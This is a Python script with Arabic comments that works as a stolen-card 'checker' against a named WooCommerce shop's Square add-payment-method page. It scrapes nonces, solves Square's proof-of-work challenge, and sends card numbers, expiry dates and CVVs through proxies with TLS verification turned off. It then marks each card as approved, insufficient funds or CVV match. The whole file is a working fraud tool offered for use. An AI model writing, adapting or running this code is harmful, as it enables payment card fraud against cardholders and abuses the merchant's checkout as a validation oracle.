"""
بوابة الدفع: Square Auth SQ-2
الموقع: www.nancynixrice.com
نوع البوابة: Square Auth (WooCommerce Square)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج nonce و applicationId و locationId
2. GET https://pci-connect.squareup.com/payments/hydrate -> الحصول على sessionId و instanceId و challenge
3. Proof-of-Work (sha256) -> حل التحدي
4. POST https://pci-connect.squareup.com/v2/card-nonce -> الحصول على card_nonce
5. POST https://pci-connect.squareup.com/v2/analytics/verifications -> الحصول على verification_token
6. POST /my-account/add-payment-method/ -> النتيجة النهائية
"""
import aiohttp
import asyncio
import hashlib
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


def solve_pow(challenge: dict) -> str:
    """حل تحدي Proof-of-Work الخاص بـ Square."""
    prefix = challenge.get("prefix", "")
    target = challenge.get("target", 0)
    nonce = 0
    while True:
        text = f"{prefix}{nonce}"
        h = hashlib.sha256(text.encode()).hexdigest()
        if int(h, 16) < target:
            return str(nonce)
        nonce += 1


async def req1_get_page_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب nonce و applicationId و locationId."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://www.nancynixrice.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text = await r.text()

        nonce_match = re.search(r'name="_wpnonce" value="([^"]+)"', text)
        app_id_match = re.search(r'applicationId: "([^"]+)"', text)
        loc_id_match = re.search(r'locationId: "([^"]+)"', text)

        if not nonce_match or not app_id_match or not loc_id_match:
            raise RuntimeError("Failed to extract Square tokens from page")

        return nonce_match.group(1), app_id_match.group(1), loc_id_match.group(1)
    except Exception as e:
        raise RuntimeError(f"req1_get_page_tokens failed: {e}") from e


async def req2_hydrate(
    session: aiohttp.ClientSession,
    app_id: str,
    loc_id: str,
    proxy_url: str = None,
) -> tuple[str, str, dict]:
    """الخطوة 2: الحصول على sessionId و instanceId و challenge."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    url = f"https://pci-connect.squareup.com/payments/hydrate?applicationId={app_id}&locationId={loc_id}"
    try:
        async with session.get(url, headers=headers, proxy=proxy_url) as r:
            data = await r.json(content_type=None)

        return (
            data.get("sessionId", ""),
            data.get("instanceId", ""),
            data.get("challenge", {}),
        )
    except Exception as e:
        raise RuntimeError(f"req2_hydrate failed: {e}") from e


async def req3_get_card_nonce(
    session: aiohttp.ClientSession,
    session_id: str,
    instance_id: str,
    pow_nonce: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3+4: الحصول على card_nonce من Square PCI."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    card_data = {
        "card_number": cc,
        "cvv": cvv,
        "expiration_month": mes,
        "expiration_year": ano,
        "session_id": session_id,
        "instance_id": instance_id,
        "pow_nonce": pow_nonce,
    }
    try:
        async with session.post(
            "https://pci-connect.squareup.com/v2/card-nonce",
            json=card_data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        return res.get("card_nonce", "")
    except Exception as e:
        raise RuntimeError(f"req3_get_card_nonce failed: {e}") from e


async def req4_verify_nonce(
    session: aiohttp.ClientSession,
    cnon: str,
    session_id: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 5: الحصول على verification_token."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    data = {"card_nonce": cnon, "session_id": session_id}
    try:
        async with session.post(
            "https://pci-connect.squareup.com/v2/analytics/verifications",
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        return res.get("verification_token", "")
    except Exception as e:
        raise RuntimeError(f"req4_verify_nonce failed: {e}") from e


async def req5_submit_payment(
    session: aiohttp.ClientSession,
    cnon: str,
    verf: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 6: إرسال وسيلة الدفع النهائية."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    payload = {
        "payment_method": "square_credit_card",
        "square_credit_card_source": cnon,
        "square_credit_card_token": verf,
        "_wpnonce": nonce,
        "action": "woocommerce_add_payment_method",
    }
    try:
        async with session.post(
            "https://www.nancynixrice.com/my-account/add-payment-method/",
            data=payload,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req5_submit_payment failed: {e}") from e


async def process_SQ_2(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Square Auth SQ-2."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("SQ-2-Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            nonce, app_id, loc_id = await req1_get_page_tokens(session, proxy_url)
            session_id, instance_id, challenge = await req2_hydrate(session, app_id, loc_id, proxy_url)
            pow_nonce = solve_pow(challenge) if challenge else ""
            cnon = await req3_get_card_nonce(session, session_id, instance_id, pow_nonce, cc, mes, ano, cvv, proxy_url)
            verf = await req4_verify_nonce(session, cnon, session_id, proxy_url)
            final_text = await req5_submit_payment(session, cnon, verf, nonce, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "Payment method successfully added" in final_text or "Success" in final_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Approved"
    elif "insufficient funds" in final_text.lower():
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "Insufficient Funds"
    elif "incorrect_cvc" in final_text or "CVV" in final_text:
        return f"✅ | {cc}|{mes}|{ano}|{cvv}", "CCN/CVC Match"
    else:
        msg_match = re.search(r'class="woocommerce-error"><li>([^<]+)</li>', final_text)
        response_msg = msg_match.group(1) if msg_match else "Declined"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", response_msg
